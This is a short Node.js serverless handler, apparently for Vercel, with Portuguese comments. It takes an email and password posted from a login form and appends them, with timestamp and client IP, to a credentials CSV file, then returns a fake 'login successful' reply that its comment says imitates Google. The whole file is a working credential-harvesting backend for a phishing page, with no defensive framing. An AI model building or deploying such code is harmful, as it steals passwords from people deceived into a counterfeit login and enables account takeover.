const fs = require('fs');
const path = require('path');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

// Caminho do arquivo CSV (usar /tmp na Vercel)
const CSV_FILE = path.join('/tmp', 'credentials.csv');

// Criar arquivo CSV com cabeçalhos se não existir
const csvWriter = createCsvWriter({
    path: CSV_FILE,
    header: [
        { id: 'timestamp', title: 'Timestamp' },
        { id: 'email', title: 'Email' },
        { id: 'password', title: 'Password' },
        { id: 'ip', title: 'IP Address' }
    ],
    append: true
});

// Verificar se o arquivo existe, se não, criar com cabeçalhos
if (!fs.existsSync(CSV_FILE)) {
    csvWriter.writeRecords([]).then(() => {
        console.log('Arquivo CSV criado com sucesso');
    });
}

module.exports = async (req, res) => {
    // Apenas aceitar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, password } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Salvar no CSV
        await csvWriter.writeRecords([{
            timestamp: timestamp,
            email: email,
            password: password,
            ip: ip
        }]);

        console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);

        // Retornar sucesso (simular resposta do Google)
        res.json({ 
            success: true,
            message: 'Login realizado com sucesso'
        });

    } catch (error) {
        console.error('Erro ao salvar credenciais:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
